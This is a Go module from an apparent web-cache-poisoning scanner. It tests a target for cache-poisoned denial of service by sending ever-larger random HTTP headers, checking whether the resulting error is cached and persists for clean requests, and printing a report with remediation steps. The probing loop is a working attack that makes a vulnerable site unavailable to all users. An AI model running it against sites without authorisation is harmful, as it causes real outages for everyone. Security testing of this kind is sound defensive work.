package cpdos

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/output"
	"github.com/wealeson1/wcpvs/pkg/utils"
)

type HHO struct {
	payload string
}

var HHOTecnique *HHO

func init() {
	HHOTecnique = NewHHO()
}

func NewHHO() *HHO {
	payload := utils.RandomString(20480)
	return &HHO{
		payload: payload,
	}
}

func (h *HHO) Scan(target *models.TargetStruct) {
	if target.Cache.NoCache {
		return
	}

	// 首先获取正常响应的基准
	baselineStatus := target.Response.StatusCode

	headerSize := 8192
	mixSize := 40960

	for headerSize <= mixSize {
		randomHeader := utils.RandomString(5)
		resp, err := tecniques.GetRespNoPayload(target, tecniques.HEADER, map[string]string{randomHeader: utils.RandomString(headerSize)})
		if err != nil {
			gologger.Debug().Msgf("HHO test failed for size %d: %v", headerSize, err)
			headerSize = headerSize + 1024
			continue
		}
		respBodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			utils.CloseReader(resp.Body)
			gologger.Error().Msg(err.Error())
			headerSize = headerSize + 1024
			continue
		}
		utils.CloseReader(resp.Body)

		// 检测是否导致错误（400, 431, 413等）
		isError := (resp.StatusCode == http.StatusBadRequest ||
			resp.StatusCode == 431 ||
			resp.StatusCode == 413) ||
			(resp.StatusCode == http.StatusBadRequest && strings.Contains(string(respBodyBytes), "Too Large"))

		if isError || resp.StatusCode != target.Response.StatusCode {
			// 检查错误响应是否有缓存标识
			hasCustomHeaders, _ := utils.HasCustomHeaders(resp)
			if !hasCustomHeaders {
				gologger.Debug().Msgf("HHO: Error response has no cache headers for %s", target.Request.URL)
				headerSize = headerSize + 1024
				continue
			}

			// 检查错误是否被缓存
			if !utils.IsCacheHit(target, &resp.Header) {
				gologger.Debug().Msgf("HHO: Error response not cached for %s", target.Request.URL)
				headerSize = headerSize + 1024
				continue
			}

			// 关键：验证持久性 - 发送干净的请求看是否还返回错误
			isPersistent := h.verifyPersistence(target, baselineStatus)
			if !isPersistent {
				gologger.Debug().Msgf("HHO: Error not persistent for %s (size: %d)", target.Request.URL, headerSize)
				headerSize = headerSize + 1024
				continue
			}

			// 确认为CPDoS漏洞 - 输出详细报告
			h.reportVulnerability(target, headerSize, baselineStatus, resp, respBodyBytes)
			return
		}

		headerSize = headerSize + 1024
	}
}

// verifyPersistence 验证CPDoS是否持久化
func (h *HHO) verifyPersistence(target *models.TargetStruct, expectedStatus int) bool {
	// 等待缓存稳定
	time.Sleep(500 * time.Millisecond)

	// 发送3次干净的请求
	errorCount := 0
	for i := 0; i < 3; i++ {
		cleanReq, err := utils.CloneRequest(target.Request)
		if err != nil {
			continue
		}

		resp, err := utils.CommonClient.Do(cleanReq)
		if err != nil || resp == nil {
			continue
		}
		utils.CloseReader(resp.Body)

		// 如果干净的请求也返回错误状态码，说明缓存被投毒了
		if resp.StatusCode != expectedStatus {
			errorCount++
		}

		time.Sleep(200 * time.Millisecond)
	}

	// 如果3次中至少有2次返回错误，确认为持久
	return errorCount >= 2
}

// reportVulnerability 输出HHO CPDoS漏洞的详细报告
func (h *HHO) reportVulnerability(target *models.TargetStruct, headerSize, baselineStatus int,
	resp *http.Response, respBody []byte) {

	// 构建攻击请求
	randomHeader := utils.RandomString(5)
	testReq, err := utils.CloneRequest(target.Request)
	if err != nil || testReq == nil {
		gologger.Debug().Msgf("Failed to clone request for HHO report: %v", err)
		testReq = target.Request // Fallback
	}
	if testReq != nil {
		testReq.Header.Set(randomHeader, utils.RandomString(headerSize))
	}

	// 提取缓存键
	cacheKeys := []string{}
	if target.Cache.CKIsGet {
		cacheKeys = append(cacheKeys, target.Cache.GetCacheKeys...)
	}
	if target.Cache.CKIsHeader {
		cacheKeys = append(cacheKeys, target.Cache.HeaderCacheKeys...)
	}

	// 格式化请求和响应
	reqStr := output.FormatRequestSimple(testReq, fmt.Sprintf("Huge header: %s with %d bytes", randomHeader, headerSize))
	bodySnippet := output.ExtractBodySnippet(respBody, 300)
	respStr := output.FormatResponse(resp, bodySnippet, "")

	// 创建漏洞报告
	report := &output.VulnerabilityReport{
		Severity:     output.SeverityCritical,
		Type:         output.VulnTypeCPDoSHHO,
		Target:       target.Request.URL.String(),
		CDN:          utils.DetectCDNType(target.Response),
		CacheKeys:    cacheKeys,
		AttackVector: fmt.Sprintf("Huge HTTP header (%d bytes) causes server error that gets cached", headerSize),
		Request:      reqStr,
		Response:     respStr,
		Impact: fmt.Sprintf("Service becomes unavailable for ALL users - cached error response (status %d instead of %d)",
			resp.StatusCode, baselineStatus),
		Persistent: true,
		Remediation: []string{
			"Configure cache to not cache error responses (4xx, 5xx)",
			"Implement header size validation before caching",
			"Set appropriate cache control headers for error responses",
			"Monitor and alert on cached error responses",
		},
	}

	report.Print()
}
